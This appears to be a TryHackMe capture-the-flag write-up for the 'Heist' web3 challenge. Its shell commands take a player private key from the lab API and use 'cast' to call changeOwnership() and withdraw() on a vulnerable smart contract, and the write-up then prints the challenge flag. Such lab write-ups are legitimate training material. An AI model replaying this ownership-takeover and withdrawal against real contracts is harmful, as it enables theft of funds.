<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/0b5c9599-56d3-402e-92e2-f3379451752b"><br>
June 16, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>406</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
From the Hackfinity Battle CTF event. Click <a href="https://tryhackme.com/room/hfb1heist"</a> here to access this challenge.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/71f342f2-1273-4702-84de-45f187c4664c1620"></p>


<h2> Task 1 . Flags</h2>

```bash
root@ip-10-10-13-46:~/Heist# RPC_URL=http://10.10.141.163:8545
root@ip-10-10-13-46:~/Heist# API_URL=http://10.10.141.163
root@ip-10-10-13-46:~/Heist# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
root@ip-10-10-13-46:~/Heist# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
root@ip-10-10-13-46:~/Heist# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
root@ip-10-10-13-46:~/Heist# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
root@ip-10-10-13-46:~/Heist# echo "Check if is solved: $is_solved"
Check if is solved: false
root@ip-10-10-13-46:~/Heist# ls
root@ip-10-10-13-46:~/Heist# 

```

![image](https://github.com/user-attachments/assets/7be30d23-5385-40f8-835d-4b5fded47813)

```bash
root@ip-10-10-13-46:~/Heist# cast send $CONTRACT_ADDRESS "changeOwnership()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy
...
root@ip-10-10-13-46:~/Heist# cast send $CONTRACT_ADDRESS "withdraw()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy

```

![image](https://github.com/user-attachments/assets/a7c9adef-e2ae-4007-8ca3-bb1980914654)

```bash
root@ip-10-10-13-46:~/Heist# cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
```


![image](https://github.com/user-attachments/assets/07697333-17fa-46ee-ac38-b570d3136d7b)


![image](https://github.com/user-attachments/assets/3359abb2-d833-41c1-8691-99c8c203d3f0)

![image](https://github.com/user-attachments/assets/fcf18250-0f62-41de-80b4-b5f8d246539c)

```bash
THM{web3_h31st_d0ne}
```

<br>
<br>

![image](https://github.com/user-attachments/assets/17e625ce-7b19-4e7e-aefa-83c5f49e2f7e)

![image](https://github.com/user-attachments/assets/13450f1c-8fd8-49f0-a8e2-5bc797824331)


<br>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 16 2025      | 406      |     201st    |      5ᵗʰ     |     338ᵗʰ   |     8ᵗʰ    |  108,333 |    783    |     63    |

</div>

![image](https://github.com/user-attachments/assets/e2624c61-4c55-457f-ad39-d0fd687fe032)


![image](https://github.com/user-attachments/assets/47549169-c089-43a5-8f79-dbfe135aa313)

![image](https://github.com/user-attachments/assets/ecccff90-bcfd-447f-bb72-7c4400a18cbf)

![image](https://github.com/user-attachments/assets/552380b7-f600-4e5b-9382-c67e21ed00e7)

![image](https://github.com/user-attachments/assets/59f3067f-fdd0-4ec0-bb6d-1a91b6c59eba)







